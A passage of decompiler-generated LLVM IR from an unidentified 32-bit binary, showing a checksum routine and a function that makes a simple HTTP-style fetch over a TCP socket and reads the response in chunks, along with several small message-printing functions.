dec_label_pc_10000ed0:                            ; preds = %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge, %dec_label_pc_10000e9c, %dec_label_pc_10000ea8
  %stack_var_-32.1 = phi i32 [ %v2_10000ec8, %dec_label_pc_10000ea8 ], [ 0, %dec_label_pc_10000e9c ], [ %v2_10000e70, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ]
  %v4_10000ed4 = sdiv i32 %stack_var_-32.1, 65536
  %v1_10000edc = urem i32 %stack_var_-32.1, 65536
  %v2_10000ee0 = add nsw i32 %v4_10000ed4, %v1_10000edc
  %v4_10000eec = sdiv i32 %v2_10000ee0, 65536
  %v2_10000ef4 = add nsw i32 %v4_10000eec, %v2_10000ee0
  %v2_10000f0019 = urem i32 %v2_10000ef4, 65536
  %v1_10000f0c = xor i32 %v2_10000f0019, 65535
  ret i32 %v1_10000f0c

; uselistorder directives
  uselistorder i32 %v2_10000ee0, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v1_10000e88, { 0, 2, 1 }
  uselistorder i32 %v2_10000e70, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10000ed0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10000e60, { 1, 0 }
}

define i32 @function_10000f30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10000f30:
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-5176 = alloca i32, align 4
  %stack_var_-5180 = alloca i32, align 4
  %stack_var_-5224 = alloca i32, align 4
  %stack_var_-5164 = alloca i32, align 4
  %stack_var_-5232 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000f30 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000f30, i32* %stack_var_-5232, align 4
  %v1_10000f5c = call i32 @function_100004f0(i32 %arg2)
  %v3_10000f64 = icmp eq i32 %v1_10000f5c, 0
  br i1 %v3_10000f64, label %dec_label_pc_10000f6c, label %dec_label_pc_10001504

dec_label_pc_10000f6c:                            ; preds = %dec_label_pc_10000f30
  %v2_10000f70 = icmp sgt i32 %arg3, 1
  br i1 %v2_10000f70, label %dec_label_pc_10000f98, label %dec_label_pc_10000f78

dec_label_pc_10000f78:                            ; preds = %dec_label_pc_10000f6c
  %v5_10000f8c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_1000cec8.22 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10000f94 = call i32 @function_10008858()
  br label %dec_label_pc_10000f98

dec_label_pc_10000f98:                            ; preds = %dec_label_pc_10000f6c, %dec_label_pc_10000f78
  store i32 268439464, i32* @lr, align 4
  %v3_10000fa4 = call i32 @function_10007cb8(i32 2, i32 1, i32 0)
  %v4_10000fb8 = icmp eq i32 %v3_10000fa4, -1
  br i1 %v4_10000fb8, label %dec_label_pc_10000fc0, label %dec_label_pc_10000fe0

dec_label_pc_10000fc0:                            ; preds = %dec_label_pc_10000f98
  %v5_10000fd4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1000ceec.25 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10000fdc = call i32 @function_10008858()
  br label %dec_label_pc_10000fe0

dec_label_pc_10000fe0:                            ; preds = %dec_label_pc_10000f98, %dec_label_pc_10000fc0
  %v1_10000fe4 = add i32 %arg4, 4
  %v1_10000fe8 = inttoptr i32 %v1_10000fe4 to i32*
  %v2_10000fe8 = load i32, i32* %v1_10000fe8, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000cf14.27 to i32), i32* @r4, align 4
  %v5_10000ffc = inttoptr i32 %v2_10000fe8 to i8*
  %v6_10000ffc = call i32 @function_10006f78(i8* %v5_10000ffc, i32 ptrtoint ([8 x i8]* @global_var_1000cf14.27 to i32), i32 7, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10001004 = icmp eq i32 %v6_10000ffc, 0
  %v2_10001014 = load i32, i32* %v1_10000fe8, align 4
  br i1 %v3_10001004, label %dec_label_pc_1000100c, label %dec_label_pc_10001030

dec_label_pc_1000100c:                            ; preds = %dec_label_pc_10000fe0
  %v1_10001018 = add i32 %v2_10001014, 7
  %v2_1000101c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001028 = inttoptr i32 %v1_10001018 to i8*
  %v3_10001028 = call i32 @function_10006eb4(i32 %v2_1000101c, i8* %v2_10001028)
  br label %dec_label_pc_1000104c

dec_label_pc_10001030:                            ; preds = %dec_label_pc_10000fe0
  %v2_1000103c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001048 = inttoptr i32 %v2_10001014 to i8*
  %v3_10001048 = call i32 @function_10006eb4(i32 %v2_1000103c, i8* %v2_10001048)
  br label %dec_label_pc_1000104c

dec_label_pc_1000104c:                            ; preds = %dec_label_pc_1000100c, %dec_label_pc_10001030
  %v2_10001068.pre-phi = phi i32 [ %v2_1000101c, %dec_label_pc_1000100c ], [ %v2_1000103c, %dec_label_pc_10001030 ]
  %v2_10001084 = ptrtoint i32* %stack_var_-5224 to i32
  store i32 %v2_10001068.pre-phi, i32* @r3, align 4
  %v0_1000107065 = call i32 @function_10006ed4()
  %v2_1000107867 = icmp eq i32 %v0_1000107065, 0
  br i1 %v2_1000107867, label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge, label %dec_label_pc_10001080

dec_label_pc_10001058:                            ; preds = %dec_label_pc_10001080
  %v1_1000105c = add i32 %storemerge570, 1
  store i32 %v2_10001068.pre-phi, i32* @r3, align 4
  %v0_10001070 = call i32 @function_10006ed4()
  %v2_10001078 = icmp ult i32 %v1_1000105c, %v0_10001070
  br i1 %v2_10001078, label %dec_label_pc_10001080, label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge

dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge: ; preds = %dec_label_pc_1000104c, %dec_label_pc_10001058
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_1000104c ], [ %v1_1000105c, %dec_label_pc_10001058 ]
  %.pre29 = add i32 %storemerge5.lcssa, %v2_10001084
  %.pre30 = add i32 %.pre29, 60
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_1000109c

dec_label_pc_10001080:                            ; preds = %dec_label_pc_1000104c, %dec_label_pc_10001058
  %storemerge570 = phi i32 [ %v1_1000105c, %dec_label_pc_10001058 ], [ 0, %dec_label_pc_1000104c ]
  %v2_10001088 = add i32 %storemerge570, %v2_10001084
  %v1_1000108c = add i32 %v2_10001088, 60
  %v2_1000108c = inttoptr i32 %v1_1000108c to i8*
  %v3_1000108c = load i8, i8* %v2_1000108c, align 1
  %v3_10001094 = icmp eq i8 %v3_1000108c, 47
  br i1 %v3_10001094, label %dec_label_pc_1000109c, label %dec_label_pc_10001058

dec_label_pc_1000109c:                            ; preds = %dec_label_pc_10001080, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge
  %storemerge564 = phi i32 [ %storemerge5.lcssa, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge ], [ %storemerge570, %dec_label_pc_10001080 ]
  %v4_100010ac.pre-phi = phi i8* [ %.pre31, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge ], [ %v2_1000108c, %dec_label_pc_10001080 ]
  store i8 0, i8* %v4_100010ac.pre-phi, align 1
  store i32 2, i32* %stack_var_-5180, align 4
  store i32 80, i32* @r3, align 4
  %v1_100010bc = call i32 @function_10007640(i32 80)
  store i32 268439764, i32* @lr, align 4
  %v1_100010d0 = call i32 @function_1000776c(i32 %v2_10001068.pre-phi)
  %v4_100010e4 = icmp eq i32 %v1_100010d0, -1
  br i1 %v4_100010e4, label %dec_label_pc_100010ec, label %dec_label_pc_10001160

dec_label_pc_100010ec:                            ; preds = %dec_label_pc_1000109c
  store i32 268439800, i32* @lr, align 4
  %v2_100010f4 = call i32 @function_100077a0(i32 %v2_10001068.pre-phi, i32 -1)
  %v3_10001104 = icmp eq i32 %v2_100010f4, 0
  br i1 %v3_10001104, label %dec_label_pc_1000110c, label %dec_label_pc_1000112c

dec_label_pc_1000110c:                            ; preds = %dec_label_pc_100010ec
  %v5_10001120 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000cf1c.30 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10001128 = call i32 @function_10008858()
  br label %dec_label_pc_1000112c

dec_label_pc_1000112c:                            ; preds = %dec_label_pc_100010ec, %dec_label_pc_1000110c
  %v2_10001130 = ptrtoint i32* %stack_var_-5176 to i32
  %v1_10001138 = add i32 %v2_100010f4, 16
  %v2_10001138 = inttoptr i32 %v1_10001138 to i32*
  %v3_10001138 = load i32, i32* %v2_10001138, align 4
  %v1_1000113c = inttoptr i32 %v3_10001138 to i32*
  %v2_1000113c = load i32, i32* %v1_1000113c, align 4
  store i32 %v2_1000113c, i32* %r11.global-to-local, align 4
  %v1_10001144 = add i32 %v2_100010f4, 12
  %v2_10001144 = inttoptr i32 %v1_10001144 to i32*
  %v3_10001144 = load i32, i32* %v2_10001144, align 4
  store i32 %v2_10001130, i32* @r3, align 4
  store i32 %v2_1000113c, i32* @r4, align 4
  store i32 %v3_10001144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000115c.33 to i32), i32* @lr, align 4
  %v0_10001158 = call i32 @function_10006d88()
  br label %dec_label_pc_10001168

dec_label_pc_10001160:                            ; preds = %dec_label_pc_1000109c
  store i32 %v1_100010d0, i32* %stack_var_-5176, align 4
  br label %dec_label_pc_10001168

dec_label_pc_10001168:                            ; preds = %dec_label_pc_1000112c, %dec_label_pc_10001160
  %v2_10001180.pre-phi = ptrtoint i32* %stack_var_-5180 to i32
  store i32 268439956, i32* @lr, align 4
  %v3_10001190 = call i32 @function_10007ba0(i32 %v3_10000fa4, i32 %v2_10001180.pre-phi, i32 16)
  %v3_10001198 = icmp eq i32 %v3_10001190, 0
  br i1 %v3_10001198, label %dec_label_pc_100011c0, label %dec_label_pc_100011a0

dec_label_pc_100011a0:                            ; preds = %dec_label_pc_10001168
  %v5_100011b4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000cf44.34 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_100011bc = call i32 @function_10008858()
  br label %dec_label_pc_100011c0

dec_label_pc_100011c0:                            ; preds = %dec_label_pc_10001168, %dec_label_pc_100011a0
  %v2_100011c8 = add i32 %v2_10001068.pre-phi, 1
  %v1_100011cc = add i32 %v2_100011c8, %storemerge564
  store i32 %v2_10001068.pre-phi, i32* %r11.global-to-local, align 4
  %v6_100011ec = call i32 @function_1000041c(i32 %v3_10000fa4, i32 ptrtoint ([276 x i8]* @global_var_1000cf6c.36 to i32), i32 %v1_100011cc, i32 %v2_10001068.pre-phi)
  %v5_10001204 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1000d080.37 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v1_1000120c = add i32 %arg4, 8
  %v1_10001210 = inttoptr i32 %v1_1000120c to i32*
  %v2_10001210 = load i32, i32* %v1_10001210, align 4
  store i32 268440100, i32* @lr, align 4
  %v3_10001220 = call i32 @function_10004ca0(i32 %v2_10001210, i32 ptrtoint ([3 x i8]* @global_var_1000d09c.38 to i32))
  %v2_1000122c = ptrtoint i32* %stack_var_-4140 to i32
  br label %dec_label_pc_1000122c

dec_label_pc_1000122c:                            ; preds = %dec_label_pc_10001388, %dec_label_pc_100011c0
  store i32 268440132, i32* @lr, align 4
  %v4_10001240 = call i32 @function_10007c04(i32 %v3_10000fa4, i32 %v2_1000122c, i32 4096, i32 0)
  %tmp58 = icmp slt i32 %v4_10001240, 1
  br i1 %tmp58, label %dec_label_pc_100013a8, label %dec_label_pc_10001258

dec_label_pc_10001258:                            ; preds = %dec_label_pc_1000122c
  %v2_1000125c = icmp sgt i32 %v4_10001240, 4095
  br i1 %v2_1000125c, label %dec_label_pc_10001284.lr.ph, label %dec_label_pc_10001264

dec_label_pc_10001264:                            ; preds = %dec_label_pc_10001258
  %v2_1000126c = add i32 %v4_10001240, %v2_10001084
  %v3_10001274 = add i32 %v2_1000126c, 1084
  %v4_10001274 = inttoptr i32 %v3_10001274 to i8*
  store i8 0, i8* %v4_10001274, align 1
  br label %dec_label_pc_10001284.lr.ph

dec_label_pc_10001284.lr.ph:                      ; preds = %dec_label_pc_10001264, %dec_label_pc_10001258
  br label %dec_label_pc_10001284

dec_label_pc_10001284:                            ; preds = %dec_label_pc_10001284.lr.ph, %dec_label_pc_10001388
  %storemerge625 = phi i32 [ 0, %dec_label_pc_10001284.lr.ph ], [ %v1_1000138c, %dec_label_pc_10001388 ]
  %v2_10001290 = add i32 %storemerge625, %v2_1000122c
  store i32 ptrtoint ([5 x i8]* @global_var_1000d0a0.39 to i32), i32* @r4, align 4
  %v5_100012a4 = inttoptr i32 %v2_10001290 to i8*
  %v6_100012a4 = call i32 @function_10006f78(i8* %v5_100012a4, i32 ptrtoint ([5 x i8]* @global_var_1000d0a0.39 to i32), i32 4, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100012ac = icmp eq i32 %v6_100012a4, 0
  br i1 %v3_100012ac, label %dec_label_pc_100012b4, label %dec_label_pc_10001388

dec_label_pc_100012b4:                            ; preds = %dec_label_pc_10001284
  %v1_100012b8 = add i32 %storemerge625, 4
  %v2_1000137c18 = icmp slt i32 %v1_100012b8, %v4_10001240
  br i1 %v2_1000137c18, label %dec_label_pc_100012c4.lr.ph, label %dec_label_pc_100013a8

dec_label_pc_100012c4.lr.ph:                      ; preds = %dec_label_pc_100012b4
  %v1_100012d0 = add i32 %v3_10001220, 52
  %v2_100012d0 = inttoptr i32 %v1_100012d0 to i32*
  %v1_100012e0 = add i32 %v3_10001220, 16
  %v2_100012e0 = inttoptr i32 %v1_100012e0 to i32*
  %v1_100012e8 = add i32 %v3_10001220, 28
  %v2_100012e8 = inttoptr i32 %v1_100012e8 to i32*
  br label %dec_label_pc_100012c4

dec_label_pc_100012c4:                            ; preds = %dec_label_pc_100012c4.lr.ph, %dec_label_pc_10001368
  %storemerge721 = phi i32 [ %v1_100012b8, %dec_label_pc_100012c4.lr.ph ], [ %v1_1000136c, %dec_label_pc_10001368 ]
  %v3_100012d0 = load i32, i32* %v2_100012d0, align 4
  %v3_100012d4 = icmp eq i32 %v3_100012d0, 0
  br i1 %v3_100012d4, label %dec_label_pc_10001348, label %dec_label_pc_100012dc

dec_label_pc_100012dc:                            ; preds = %dec_label_pc_100012c4
  %v3_100012e0 = load i32, i32* %v2_100012e0, align 4
  store i32 %v3_100012e0, i32* %r11.global-to-local, align 4
  %v3_100012e8 = load i32, i32* %v2_100012e8, align 4
  %v2_100012ec = icmp ult i32 %v3_100012e0, %v3_100012e8
  br i1 %v2_100012ec, label %dec_label_pc_100012f4, label %dec_label_pc_10001324

dec_label_pc_100012f4:                            ; preds = %dec_label_pc_100012dc
  %v3_100012f8 = load i32, i32* %v2_100012e0, align 4
  store i32 %v3_100012f8, i32* %r11.global-to-local, align 4
  %v2_10001304 = add i32 %storemerge721, %v2_10001084
  %v1_10001308 = add i32 %v2_10001304, 1084
  %v2_10001308 = inttoptr i32 %v1_10001308 to i8*
  %v3_10001308 = load i8, i8* %v2_10001308, align 1
  %v3_10001310 = inttoptr i32 %v3_100012f8 to i8*
  store i8 %v3_10001308, i8* %v3_10001310, align 1
  %v0_10001314 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001314 = add i32 %v0_10001314, 1
  store i32 %v1_10001314, i32* %v2_100012e0, align 4
  br label %dec_label_pc_10001368

dec_label_pc_10001324:                            ; preds = %dec_label_pc_100012dc
  %v2_1000132c = add i32 %storemerge721, %v2_10001084
  %v1_10001330 = add i32 %v2_1000132c, 1084
  %v2_10001330 = inttoptr i32 %v1_10001330 to i8*
  %v3_10001330 = load i8, i8* %v2_10001330, align 1
  store i32 ptrtoint (i32* @global_var_10001344.40 to i32), i32* @lr, align 4
  %v4_10001340 = call i32 @function_10006b50(i8 %v3_10001330, i32 %v3_10001220, i32 %v2_1000132c)
  br label %dec_label_pc_10001368

dec_label_pc_10001348:                            ; preds = %dec_label_pc_100012c4
  %v2_10001350 = add i32 %storemerge721, %v2_10001084
  %v1_10001354 = add i32 %v2_10001350, 1084
  %v2_10001354 = inttoptr i32 %v1_10001354 to i8*
  %v3_10001354 = load i8, i8* %v2_10001354, align 1
  store i32 268440424, i32* @lr, align 4
  %v4_10001364 = call i32 @function_100066f0(i8 %v3_10001354, i32 %v3_10001220, i32 %v2_10001350)
  br label %dec_label_pc_10001368

dec_label_pc_10001368:                            ; preds = %dec_label_pc_10001324, %dec_label_pc_100012f4, %dec_label_pc_10001348
  %v1_1000136c = add i32 %storemerge721, 1
  %v2_1000137c = icmp slt i32 %v1_1000136c, %v4_10001240
  br i1 %v2_1000137c, label %dec_label_pc_100012c4, label %dec_label_pc_100013a8

dec_label_pc_10001388:                            ; preds = %dec_label_pc_10001284
  %v1_1000138c = add nuw nsw i32 %storemerge625, 1
  %v2_1000139c = icmp slt i32 %v1_1000138c, %v4_10001240
  br i1 %v2_1000139c, label %dec_label_pc_10001284, label %dec_label_pc_1000122c

dec_label_pc_100013a8:                            ; preds = %dec_label_pc_1000122c, %dec_label_pc_10001368, %dec_label_pc_100012b4
  %v2_100013b0 = load i32, i32* %v1_10001210, align 4
  %v6_100013cc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d0a8.41 to i32), i32 %arg2, i32 %v2_100013b0)
  %v1_10001434 = add i32 %v3_10001220, 52
  %v2_10001434 = inttoptr i32 %v1_10001434 to i32*
  %v1_10001444 = add i32 %v3_10001220, 16
  %v2_10001444 = inttoptr i32 %v1_10001444 to i32*
  %v1_1000144c = add i32 %v3_10001220, 28
  %v2_1000144c = inttoptr i32 %v1_1000144c to i32*
  br label %dec_label_pc_100013d0

dec_label_pc_100013d0:                            ; preds = %dec_label_pc_100014cc, %dec_label_pc_100013a8
  store i32 268440552, i32* @lr, align 4
  %v4_100013e4 = call i32 @function_10007c04(i32 %v3_10000fa4, i32 %v2_1000122c, i32 4096, i32 0)
  %tmp59 = icmp slt i32 %v4_100013e4, 1
  br i1 %tmp59, label %dec_label_pc_100014ec, label %dec_label_pc_100013fc

dec_label_pc_100013fc:                            ; preds = %dec_label_pc_100013d0
  %v2_10001400 = icmp sgt i32 %v4_100013e4, 4095
  br i1 %v2_10001400, label %dec_label_pc_10001428.lr.ph, label %dec_label_pc_10001408

dec_label_pc_10001408:                            ; preds = %dec_label_pc_100013fc
  %v2_10001410 = add i32 %v4_100013e4, %v2_10001084
  %v3_10001418 = add i32 %v2_10001410, 1084
  %v4_10001418 = inttoptr i32 %v3_10001418 to i8*
  store i8 0, i8* %v4_10001418, align 1
  br label %dec_label_pc_10001428.lr.ph

dec_label_pc_10001428.lr.ph:                      ; preds = %dec_label_pc_10001408, %dec_label_pc_100013fc
  br label %dec_label_pc_10001428

dec_label_pc_10001428:                            ; preds = %dec_label_pc_10001428.lr.ph, %dec_label_pc_100014cc
  %storemerge817 = phi i32 [ 0, %dec_label_pc_10001428.lr.ph ], [ %v1_100014d0, %dec_label_pc_100014cc ]
  store i32 %v3_10001220, i32* %stack_var_-5224, align 4
  %v3_10001434 = load i32, i32* %v2_10001434, align 4
  %v3_10001438 = icmp eq i32 %v3_10001434, 0
  br i1 %v3_10001438, label %dec_label_pc_100014ac, label %dec_label_pc_10001440

dec_label_pc_10001440:                            ; preds = %dec_label_pc_10001428
  %v3_10001444 = load i32, i32* %v2_10001444, align 4
  store i32 %v3_10001444, i32* %r11.global-to-local, align 4
  %v3_1000144c = load i32, i32* %v2_1000144c, align 4
  %v2_10001450 = icmp ult i32 %v3_10001444, %v3_1000144c
  br i1 %v2_10001450, label %dec_label_pc_10001458, label %dec_label_pc_10001488

dec_label_pc_10001458:                            ; preds = %dec_label_pc_10001440
  %v3_1000145c = load i32, i32* %v2_10001444, align 4
  store i32 %v3_1000145c, i32* %r11.global-to-local, align 4
  %v2_10001468 = add i32 %storemerge817, %v2_10001084
  %v1_1000146c = add i32 %v2_10001468, 1084
  %v2_1000146c = inttoptr i32 %v1_1000146c to i8*
  %v3_1000146c = load i8, i8* %v2_1000146c, align 1
  %v3_10001474 = inttoptr i32 %v3_1000145c to i8*
  store i8 %v3_1000146c, i8* %v3_10001474, align 1
  %v0_10001478 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001478 = add i32 %v0_10001478, 1
  %v3_1000147c = load i32, i32* %stack_var_-5224, align 4
  %v2_10001480 = add i32 %v3_1000147c, 16
  %v3_10001480 = inttoptr i32 %v2_10001480 to i32*
  store i32 %v1_10001478, i32* %v3_10001480, align 4
  br label %dec_label_pc_100014cc

dec_label_pc_10001488:                            ; preds = %dec_label_pc_10001440
  %v2_10001490 = add i32 %storemerge817, %v2_10001084
  %v1_10001494 = add i32 %v2_10001490, 1084
  %v2_10001494 = inttoptr i32 %v1_10001494 to i8*
  %v3_10001494 = load i8, i8* %v2_10001494, align 1
  store i32 ptrtoint (i32* @global_var_100014a8.42 to i32), i32* @lr, align 4
  %v4_100014a4 = call i32 @function_10006b50(i8 %v3_10001494, i32 %v3_10001220, i32 %v2_10001490)
  br label %dec_label_pc_100014cc

dec_label_pc_100014ac:                            ; preds = %dec_label_pc_10001428
  %v2_100014b4 = add i32 %storemerge817, %v2_10001084
  %v1_100014b8 = add i32 %v2_100014b4, 1084
  %v2_100014b8 = inttoptr i32 %v1_100014b8 to i8*
  %v3_100014b8 = load i8, i8* %v2_100014b8, align 1
  store i32 268440780, i32* @lr, align 4
  %v4_100014c8 = call i32 @function_100066f0(i8 %v3_100014b8, i32 %v3_10001220, i32 %v2_100014b4)
  br label %dec_label_pc_100014cc

dec_label_pc_100014cc:                            ; preds = %dec_label_pc_10001488, %dec_label_pc_10001458, %dec_label_pc_100014ac
  %v1_100014d0 = add nuw nsw i32 %storemerge817, 1
  %v2_100014e0 = icmp slt i32 %v1_100014d0, %v4_100013e4
  br i1 %v2_100014e0, label %dec_label_pc_10001428, label %dec_label_pc_100013d0

dec_label_pc_100014ec:                            ; preds = %dec_label_pc_100013d0
  store i32 268440820, i32* @lr, align 4
  %v1_100014f0 = inttoptr i32 %v3_10001220 to i16*
  %v2_100014f0 = call i32 @function_10004b54(i16* %v1_100014f0)
  store i32 ptrtoint ([3 x i8]* @global_var_100014fc.43 to i32), i32* @lr, align 4
  %v1_100014f8 = call i32 @function_100048e0(i32 %v3_10000fa4)
  %v0_10001500 = call i32 @function_10008858()
  br label %dec_label_pc_10001504

dec_label_pc_10001504:                            ; preds = %dec_label_pc_10000f30, %dec_label_pc_100014ec
  %v0_1000151c = phi i32 [ %v1_10000f5c, %dec_label_pc_10000f30 ], [ %v0_10001500, %dec_label_pc_100014ec ]
  %v2_10001504 = load i32, i32* %stack_var_-5232, align 4
  store i32 %v2_10001504, i32* %r11.global-to-local, align 4
  ret i32 %v0_1000151c

; uselistorder directives
  uselistorder i32 %storemerge817, { 3, 0, 1, 2 }
  uselistorder i32 %v4_100013e4, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge721, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge625, { 2, 0, 1 }
  uselistorder i32 %v4_10001240, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000122c, { 1, 0, 2 }
  uselistorder i32 %v3_10001220, { 11, 0, 1, 9, 3, 2, 10, 7, 4, 6, 5, 8 }
  uselistorder i32 %storemerge570, { 0, 2, 1 }
  uselistorder i32 %storemerge5.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000105c, { 2, 1, 0 }
  uselistorder i32 %v2_10001068.pre-phi, { 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_10001504, { 1, 0 }
  uselistorder label %dec_label_pc_100014cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001428, { 1, 0 }
  uselistorder label %dec_label_pc_100013a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001368, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100012c4, { 1, 0 }
  uselistorder label %dec_label_pc_10001284, { 1, 0 }
  uselistorder label %dec_label_pc_100011c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001168, { 1, 0 }
  uselistorder label %dec_label_pc_1000112c, { 1, 0 }
  uselistorder label %dec_label_pc_10001080, { 1, 0 }
  uselistorder label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000104c, { 1, 0 }
  uselistorder label %dec_label_pc_10000fe0, { 1, 0 }
  uselistorder label %dec_label_pc_10000f98, { 1, 0 }
}

define i32 @function_10001520(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001520:
  %tmp36 = call i8 @__decompiler_undefined_function_2()
  %v3_10001560 = load i32, i32* @global_var_10010464.16, align 4
  %v3_10001580 = icmp eq i32 %v3_10001560, 1
  %v3_1000159016 = zext i8 %tmp36 to i32
  br i1 %v3_10001580, label %dec_label_pc_10001588, label %dec_label_pc_100015f8

dec_label_pc_10001588:                            ; preds = %dec_label_pc_10001520
  %v9_100015f0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1000d0c0.44 to i32), i32 %arg2, i32 %v3_1000159016)
  br label %dec_label_pc_100016c0

dec_label_pc_100015f8:                            ; preds = %dec_label_pc_10001520
  %v9_100016bc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_1000d0e0.46 to i32), i32 %arg2, i32 %v3_1000159016)
  br label %dec_label_pc_100016c0

dec_label_pc_100016c0:                            ; preds = %dec_label_pc_10001588, %dec_label_pc_100015f8
  %storemerge = phi i32 [ %v9_100016bc, %dec_label_pc_100015f8 ], [ %v9_100015f0, %dec_label_pc_10001588 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_1000159016, { 1, 0 }
  uselistorder label %dec_label_pc_100016c0, { 1, 0 }
}

define i32 @function_100016e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100016e4:
  %v5_1000171c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1000d110.47 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_1000171c
}

define i32 @function_10001738(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001738:
  %v3_10001760 = icmp eq i32 %arg3, 1
  br i1 %v3_10001760, label %dec_label_pc_10001784, label %dec_label_pc_10001768

dec_label_pc_10001768:                            ; preds = %dec_label_pc_10001738
  %v5_1000177c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d130.48 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_10001784:                            ; preds = %dec_label_pc_10001738
  %v1_10001788 = add i32 %arg4, 4
  %v1_1000178c = inttoptr i32 %v1_10001788 to i32*
  %v2_1000178c = load i32, i32* %v1_1000178c, align 4
  store i32 %v2_1000178c, i32* @r3, align 4
  %v0_10001794 = call i32 @function_10006ed4()
  %tmp9 = icmp ult i32 %v0_10001794, 10
  br i1 %tmp9, label %dec_label_pc_100017c0, label %dec_label_pc_100017a4

dec_label_pc_100017a4:                            ; preds = %dec_label_pc_10001784
  %v5_100017b8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_1000d148.50 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_100017c0:                            ; preds = %dec_label_pc_10001784
  %v2_100017c8 = load i32, i32* %v1_1000178c, align 4
  %v5_100017e0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1000d180.52 to i32), i32 %v2_100017c8, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_100017e4:                            ; preds = %dec_label_pc_100017a4, %dec_label_pc_10001768, %dec_label_pc_100017c0
  %v0_100017f8 = phi i32 [ %v5_100017b8, %dec_label_pc_100017a4 ], [ %v5_1000177c, %dec_label_pc_10001768 ], [ %v5_100017e0, %dec_label_pc_100017c0 ]
  ret i32 %v0_100017f8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100017e4, { 2, 0, 1 }
}

define i32 @function_100017fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100017fc:
  %v3_10001824 = icmp eq i32 %arg3, 1
  br i1 %v3_10001824, label %dec_label_pc_10001894, label %dec_label_pc_1000182c

dec_label_pc_1000182c:                            ; preds = %dec_label_pc_100017fc
